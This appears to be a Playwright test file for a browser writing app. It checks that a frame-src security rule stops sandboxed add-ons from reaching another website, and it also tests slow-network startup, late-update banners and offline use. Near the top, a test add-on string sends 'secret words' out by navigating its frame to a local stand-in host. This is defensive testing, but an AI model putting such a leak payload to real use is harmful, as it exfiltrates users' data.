"""Opening the book: sealed frames can't reach another website, a slow network doesn't keep the book
from opening, an update that arrives late is offered, and the book opens with no internet.
Run:  python3 tests/test_boot.py"""
import asyncio, os, shutil, sys, tempfile
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from helpers import serve, Checks, new_device, launch, DOCS, BROWSER
from playwright.async_api import async_playwright

C = Checks()
# an add-on that tries (three times, as a determined one would) to carry words out by sending its own frame to another website
LEAK = "const go = () => { location.href = 'http://127.0.0.1:8853/leak.html?words=' + encodeURIComponent('my secret words'); }; setTimeout(go, 300); setTimeout(go, 900); setTimeout(go, 1800);"

async def main():
    url = serve(8851)
    other = serve(8853)                                   # "another website"
    # the same app without the frame rule, to prove this test can see a leak when there is one
    bare = os.path.join(tempfile.mkdtemp(), "docs"); shutil.copytree(DOCS, bare)
    idx = open(os.path.join(bare, "index.html"), encoding="utf-8").read()
    open(os.path.join(bare, "index.html"), "w", encoding="utf-8").write(idx.replace("""<meta http-equiv="Content-Security-Policy" content="frame-src 'self'">""", ""))
    bare_url = serve(8852, bare)
    async with async_playwright() as p:
        br = await launch(p)

        # ---------- 1. a sealed frame (an add-on) can't carry words out by sending itself to another website ----------
        async def leaks(u):
            ctx, pg = await new_device(br, u, token=False, viewport={"width": 1200, "height": 800})
            seen = []
            ctx.on("request", lambda r: seen.append(r.url))
            await pg.evaluate("code => window.TOL.addons.save({ name: 'Leaky', code, on: true })", LEAK)
            for _ in range(10):                                # up to 5 s for the frame to start and try to leave
                await pg.wait_for_timeout(500)
                if any(":8853/" in s for s in seen):
                    break
            running = await pg.evaluate("window.TOL.addons.running().length")
            errs = list(pg.errs)
            await ctx.close()
            return [s for s in seen if ":8853/" in s], running, errs
        got, running, errs = await leaks(bare_url)
        C.ok(len(got) >= 1, f"(without the rule, a sealed frame CAN send itself to another website: the test sees it) {got[:1]}")
        got, running, errs = await leaks(url)
        C.ok(got == [] and running == 1, f"with the rule, the add-on runs but its frame can't load another website ({got})")
        C.ok(not errs, f"no page errors {errs}")

        # ---------- 2. sealed frames made from text still work (add-ons talk to the book; a change can be tried) ----------
        ctx, pg = await new_device(br, url, token=False, viewport={"width": 1200, "height": 800})
        await pg.click("#writer textarea"); await pg.keyboard.type("A page for the add-on.", delay=5); await pg.wait_for_timeout(600)
        await pg.evaluate("window.TOL.addons.save({ name: 'Hello', on: true, code: \"bolw.addButton('Say hi', 'hi'); bolw.on('button', async () => { const n = await bolw.read(); bolw.toast('read ' + n.text.length); });\" })")
        await pg.wait_for_timeout(1200)
        await pg.click("#addonBar button"); await pg.wait_for_timeout(600)
        C.ok("read 22" in await pg.text_content("#toast"), "an add-on's own sealed frame still starts and talks to the book")
        r = await pg.evaluate("window.TOL.onboard.tryChange({ note: 'a harmless change', edits: [{ file: 'memory.js', find: 'const DAY = 86400000, MIN = 60000;', replace: 'const DAY = 86400000, MIN = 60000; /* tried */' }] })")
        C.ok(r["passed"], f"trying a change in its sealed preview still works ({[x for x in r['results'] if not x['ok']]})")
        await pg.evaluate("window.TOL.onboard.undo()")
        await ctx.close()

        # ---------- 3. a slow network: the book opens from the copy saved on this device, and offers the update when it arrives ----------
        ctx, pg = await new_device(br, url, token=False, viewport={"width": 1200, "height": 800})
        await pg.click("#writer textarea"); await pg.keyboard.type("Words written before the slow day.", delay=5); await pg.wait_for_timeout(700)
        state = {"delay": 0, "changed": False}
        async def slow(route):
            if state["delay"]:
                await asyncio.sleep(state["delay"])
            if state["changed"] and route.request.url.endswith("/memory.js"):
                resp = await route.fetch()
                return await route.fulfill(response=resp, body=(await resp.text()) + "\n/* a newer published file */\n")
            await route.continue_()
        await ctx.route(lambda u: u.startswith(url) and (u.endswith(".js") or u.endswith("app.html")), slow)
        state["delay"] = 7
        t0 = asyncio.get_event_loop().time()
        await pg.reload()
        took = asyncio.get_event_loop().time() - t0
        C.ok(await pg.evaluate("!!(window.__bolwBoot && window.__bolwBoot.ok)") and took < 6.5, f"with every file taking 7 s, the book still opens in {took:.1f} s from the saved copy")
        C.ok("slow day" in await pg.locator("#writer textarea").first.input_value(), "…with your words")
        await pg.wait_for_timeout(5000)
        C.ok(await pg.locator(".bolw-banner").count() == 0, "when the files that finally arrive are the same, nothing is said")
        state["changed"] = True
        await pg.reload(); await pg.wait_for_timeout(12000)
        C.ok(await pg.locator(".bolw-banner").count() == 1 and "newer version" in await pg.text_content(".bolw-banner"), "when a newer version arrives late, a note offers it")
        state["delay"] = 0
        await pg.click(".bolw-banner button"); await pg.wait_for_timeout(1500)
        C.ok("a newer published file" in await pg.evaluate("window.__bolwBoot.files['memory.js']"), "Reload starts the newer version")
        C.ok(not pg.errs, f"no page errors {pg.errs}")
        await ctx.close()

        # ---------- 4. the offline helper (service worker): the book opens with no internet at all ----------
        if BROWSER == "chromium":
            ctx, pg = await new_device(br, url, token=False, viewport={"width": 1200, "height": 800})
            await pg.click("#writer textarea"); await pg.keyboard.type("Written before going offline.", delay=5); await pg.wait_for_timeout(700)
            await pg.evaluate("navigator.serviceWorker.register('sw.js').then(() => navigator.serviceWorker.ready)")
            await pg.wait_for_function("navigator.serviceWorker.controller !== null || true"); await pg.wait_for_timeout(1500)
            await pg.reload(); await pg.wait_for_timeout(800)          # now the page is under the helper
            C.ok(await pg.evaluate("!!navigator.serviceWorker.controller"), "(the offline helper is running)")
            await ctx.set_offline(True)
            await pg.reload(); await pg.wait_for_timeout(1000)
            C.ok(await pg.evaluate("!!(window.__bolwBoot && window.__bolwBoot.ok)"), "with no internet, the book opens")
            C.ok("going offline" in await pg.locator("#writer textarea").first.input_value(), "…with your words, and you can keep writing")
            await pg.goto(url + "?safe=1"); await pg.wait_for_timeout(800)
            C.ok(await pg.evaluate("!!(window.__bolwBoot && window.__bolwBoot.ok && window.__bolwBoot.safe)"), "safe mode opens offline too")
            await ctx.set_offline(False)
            await ctx.close()
        else:
            print("SKIP offline-helper check (run in Chromium only: the other engines can't be taken offline reliably here)")
        await br.close()
    print(f"\n{C.passes} passed, {C.fails} failed")
    sys.exit(1 if C.fails else 0)

if __name__ == "__main__":
    asyncio.run(main())
